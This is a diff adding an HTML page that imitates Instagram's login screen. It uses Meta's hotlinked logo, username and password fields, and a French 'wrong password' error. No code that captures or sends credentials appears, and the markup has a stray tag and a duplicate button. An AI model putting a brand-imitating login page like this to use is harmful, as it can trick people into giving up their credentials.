@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<link rel="stylesheet" href="style.css">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+        style="pointer-events: none; width: 100%; margin-top: 70px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center; display: flex;">
+        <img data-bloks-name="bk.components.Image" role="heading" alt="Instagram from Meta" class="wbloks_1"
+            src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp"
+            style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
+    </div>
+    <div class="text"> Log into instagram </div>
+    <div data-bloks-name="bk.components.Flexbox" class="bloc1">
+        <div class="input-container">
+            <input type="text" id="username" class="input-field" placeholder=" " autocomplete="off">
+            <label for="username" class="input-label">Username, email or mobile number</label>
+        </div>
+    </div>
+    <div data-bloks-name="bk.components.Flexbox" class="bloc1">
+        <div class="input-container">
+            <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
+            <label for="password" class="input-label">Password</label>
+        </div>
+    </div>
+    <button class="btn-login">Log in</button>
+</div>
+<div id="error-message" class="error-text" style="display: none;">Mot de passe erroné</div>
+
+<button class="btn-login" id="login-btn">Log in</button>
+</body>
+</html>
